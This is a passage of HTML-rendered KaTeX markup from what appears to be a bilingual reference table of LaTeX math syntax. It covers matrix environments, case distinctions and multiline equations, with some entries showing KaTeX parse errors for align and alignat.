displaystyle="false"><mi>v</mi></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{matrix}  x &amp; y \\z &amp; v\end{matrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.4000000000000004em;vertical-align:-0.9500000000000004em;"></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\begin{matrix}<br>x &amp; y \\ <br>z &amp; v<br>\end{matrix}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">∣</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>x</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>y</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>z</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>v</mi></mstyle></mtd></mtr></mtable><mo fence="true">∣</mo></mrow><annotation encoding="application/x-tex">\begin{vmatrix} x &amp; y \\ z &amp; v \end{vmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.42999em;vertical-align:-0.9500199999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4799700000000002em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.25698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.85798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.87897em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.47997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4799700000000002em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.25698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.85798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.87897em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.47997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\begin{vmatrix}<br>x &amp; y \\<br>z &amp; v<br>\end{vmatrix}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">$\begin{Vmatrix} x &amp; y \ z &amp; v \end{Vmatrix} $</td><td style="text-align:left">&quot;\begin{Vmatrix}<br>x &amp; y \\<br>z &amp; v<br>\end{Vmatrix}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\begin{bmatrix} 0 &amp; \cdots &amp; 0 \\ \vdots &amp; \ddots &amp; \vdots \\ 0 &amp; \cdots &amp; 0 \end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.260000000000001em;vertical-align:-1.8800000000000006em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.352005em;"><span style="top:-1.9499950000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-3.0999950000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.1109850000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.352005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.850025em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.3800000000000003em;"><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3674999999999997em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.1674999999999995em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.8800000000000006em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.3800000000000003em;"><span style="top:-5.04em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-3.1799999999999997em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-1.9799999999999995em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.8800000000000006em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.3800000000000003em;"><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3674999999999997em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.1674999999999995em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.8800000000000006em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.352005em;"><span style="top:-1.9499950000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-3.0999950000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.1109850000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.352005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.850025em;"><span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\begin{bmatrix}<br>0 &amp; \cdots &amp; 0 \\<br>\vdots &amp; \ddots &amp; \vdots \\<br>0 &amp; \cdots &amp; 0<br>\end{bmatrix}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>x</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>y</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>z</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>v</mi></mstyle></mtd></mtr></mtable><mo fence="true">}</mo></mrow><annotation encoding="application/x-tex">\begin{Bmatrix} x &amp; y \\ z &amp; v \end{Bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">}</span></span></span></span></span></span></td><td style="text-align:left">\begin{Bmatrix}<br>x &amp; y \\<br>z &amp; v<br>\end{Bmatrix}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>x</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>y</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>z</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>v</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\begin{pmatrix} x &amp; y \\ z &amp; v \end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span></td><td style="text-align:left">\begin{pmatrix}<br>x &amp; y \\<br>z &amp; v<br>\end{pmatrix}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">(</mo><mstyle scriptlevel="1"><mtable rowspacing="0.1em" columnspacing="0.2778em"><mtr><mtd><mstyle scriptlevel="1" displaystyle="false"><mi>a</mi></mstyle></mtd><mtd><mstyle scriptlevel="1" displaystyle="false"><mi>b</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="1" displaystyle="false"><mi>c</mi></mstyle></mtd><mtd><mstyle scriptlevel="1" displaystyle="false"><mi>d</mi></mstyle></mtd></mtr></mtable></mstyle><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\bigl( \begin{smallmatrix} a&amp;b\\ c&amp;d \end{smallmatrix} \bigr)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3322159999999998em;vertical-align:-0.4161079999999999em;"></span><span class="mopen"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9161079999999999em;"><span style="top:-3.1300000000000003em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight sizing reset-size6 size3"><span class="mord mathnormal mtight">a</span></span></span><span style="top:-2.4638920000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight sizing reset-size6 size3"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4161079999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.19446em;"></span><span class="arraycolsep" style="width:0.19446em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9161079999999999em;"><span style="top:-3.1300000000000003em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight sizing reset-size6 size3"><span class="mord mathnormal mtight">b</span></span></span><span style="top:-2.4638920000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight sizing reset-size6 size3"><span class="mord mathnormal mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4161079999999999em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing size1">)</span></span></span></span></span></td><td style="text-align:left">\bigl( \begin{smallmatrix}<br>a&amp;b\\ <br/>c&amp;d<br>\end{smallmatrix} \bigr)</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">条件定义<br/>Case distinctions</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if </mtext><mi>n</mi><mtext> is even</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>3</mn><mi>n</mi><mo>+</mo><mn>1</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if </mtext><mi>n</mi><mtext> is odd</mtext></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">f(n) =\begin{cases} n/2, &amp; \text{if }n\text{ is even} \\ 3n+1, &amp; \text{if }n\text{ is odd} \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mord">/</span><span class="mord">2</span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">3</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">if </span></span><span class="mord mathnormal">n</span><span class="mord text"><span class="mord"> is even</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">if </span></span><span class="mord mathnormal">n</span><span class="mord text"><span class="mord"> is odd</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td style="text-align:left">f(n) =<br>\begin{cases}<br>n/2, &amp; \text{if }n\text{ is even} \\<br>3n+1, &amp; \text{if }n\text{ is odd}<br>\end{cases}</td></tr><tr><td style="text-align:left">多行等式<br>Multiline equations</td><td style="text-align:left"><span class='katex-error' title='ParseError: KaTeX parse error: No such environment: align at position 7: \begin{̲a̲l̲i̲g̲n̲}̲ f(x) &amp; = (a+b)…'>\begin{align} f(x) &amp; = (a+b)^2 \\ &amp; = a^2+2ab+b^2 \\ \end{align}</span></td><td style="text-align:left">\begin{align} <br>f(x) &amp; = (a+b)^2\\<br>&amp; = a<sup>2+2ab+b</sup>2 \\<br>\end{align}</td></tr><tr><td style="text-align:left"><span class='katex-error' title='ParseError: KaTeX parse error: No such environment: alignat at position 7: \begin{̲a̲l̲i̲g̲n̲a̲t̲}̲{2} f(x) &amp; = (a…'>\begin{alignat}{2} f(x) &amp; = (a-b)^2 \\ &amp; = a^2-2ab+b^2 \\ \end{alignat}</span></td><td style="text-align:left">\begin{alignat}{2}<br>f(x) &amp; = (a-b)^2 \\<br>&amp; = a<sup>2-2ab+b</sup>2 \\<br>\end{alignat}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left center left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>z</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">=</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>a</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">=</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>+</mo><mi>y</mi><mo>+</mo><mi>z</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{lcl} z &amp; = &amp; a \\ f(x,y,z) &amp; = &amp; x + y + z \end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.4000000000000004em;vertical-align:-0.9500000000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mrel">=</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mrel">=</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></td><td style="text-align:left">\begin{array}{lcl}<br>z &amp; = &amp; a \\<br>f(x,y,z) &amp; = &amp; x + y + z<br>\end{array}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left center right" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>z</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">=</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>a</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">=</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>+</mo><mi>y</mi><mo>+</mo><mi>z</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{lcr} z &amp; = &amp; a \\ f(x,y,z) &amp; = &amp; x + y + z \end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.4000000000000004em;vertical-align:-0.9500000000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span 